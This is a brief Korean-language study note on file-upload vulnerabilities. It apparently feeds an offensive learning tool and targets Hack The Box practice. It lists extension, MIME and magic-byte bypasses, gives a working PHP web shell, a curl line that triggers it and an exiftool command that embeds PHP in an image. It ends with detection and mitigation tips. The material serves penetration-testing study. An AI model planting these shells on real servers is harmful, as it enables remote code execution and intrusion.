# 학습 시드(심화): file-upload

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn file-upload`. P1: 머신별 라이트업 미참조.

## 개요
파일 업로드 취약: 검증부실로 웹셸 업로드→RCE. HTB 초기침투 빈출.

## 핵심 기법 · 열거
- 확장자 우회: shell.php.jpg, shell.pHp, shell.phtml/.php5/.phar
- Content-Type·매직바이트 위조(GIF89a; <?php ...)
- 경로제어·.htaccess 업로드(핸들러 추가)
- 이미지 메타데이터(EXIF) PHP 삽입
- SVG→XSS/XXE, 이중확장·널바이트

## 표준 도구 · 명령
```
# shell.php (PHP)
<?php system($_GET['cmd']); ?>
# 업로드 후: curl '<url>/uploads/shell.php?cmd=id'
exiftool -Comment='<?php system($_GET[c]);?>' img.jpg
```

## 블루팀 탐지
업로드 디렉터리의 실행가능 확장자 생성·웹셸 접근(cmd= 파라미터)·비정상 자식프로세스.

## 완화
확장자 허용목록·MIME+매직 검증·실행권한 제거·저장소 분리(비웹루트)·랜덤 파일명.

- 출처(검증): https://portswigger.net/web-security/file-upload
